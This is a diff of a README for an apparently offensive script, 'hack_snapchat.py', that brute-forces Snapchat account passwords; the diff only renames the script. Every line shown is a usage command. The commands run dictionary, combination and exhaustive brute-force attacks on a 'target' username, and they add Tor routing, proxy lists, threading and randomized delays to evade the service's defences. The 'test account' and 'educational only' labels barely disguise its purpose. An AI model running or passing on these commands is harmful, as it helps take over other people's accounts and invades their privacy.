@@ -98,7 +98,7 @@ asyncio>=3.9.0
 
 ### Step 3: Test Installation
 
-python snapchat_hack.py --help
+python hack_snapchat.py --help
 
 ---
 
@@ -106,19 +106,19 @@ python snapchat_hack.py --help
 
 ### Standard Password Assessment
 
-python snapchat_hack.py --username your_test_account --password-list passwords.txt
+python hack_snapchat.py --username your_test_account --password-list passwords.txt
 
 ### Anonymous Testing via Tor
 
-python snapchat_hack.py --username your_test_account --password-list passwords.txt --use-tor
+python hack_snapchat.py --username your_test_account --password-list passwords.txt --use-tor
 
 ### Advanced Multi-threaded Execution
 
-python snapchat_hack.py --username your_test_account --password-list passwords.txt --threads 4 --use-tor --min-delay 2 --max-delay 5
+python hack_snapchat.py --username your_test_account --password-list passwords.txt --threads 4 --use-tor --min-delay 2 --max-delay 5
 
 ### Proxy-Based Execution
 
-python snapchat_hack.py --username your_test_account --password-list passwords.txt --proxy-list proxies.txt --threads 3
+python hack_snapchat.py --username your_test_account --password-list passwords.txt --proxy-list proxies.txt --threads 3
 
 ---
 
@@ -126,8 +126,8 @@ python snapchat_hack.py --username your_test_account --password-list passwords.t
 
 ### 1. Dictionary-Based Testing
 
-python snapchat_hack.py --username target --password-list common_passwords.txt  
-python snapchat_hack.py --username target --password-list custom_list.txt  
+python hack_snapchat.py --username target --password-list common_passwords.txt  
+python hack_snapchat.py --username target --password-list custom_list.txt  
 
 ### 2. Mask-Based Generation
 
@@ -137,8 +137,8 @@ python snapchat_hack.py --username target --password-list custom_list.txt
 
 ### 3. Combination Strategy
 
-python snapchat_hack.py --username target --strategy combination --base-words "password,snap,user"
+python hack_snapchat.py --username target --strategy combination --base-words "password,snap,user"
 
 ### 4. Exhaustive Brute Force (Educational Only)
 
-python snapchat_hack.py --username target --strategy brute --min-length 4 --max-length 8
+python hack_snapchat.py --username target --strategy brute --min-length 4 --max-length 8
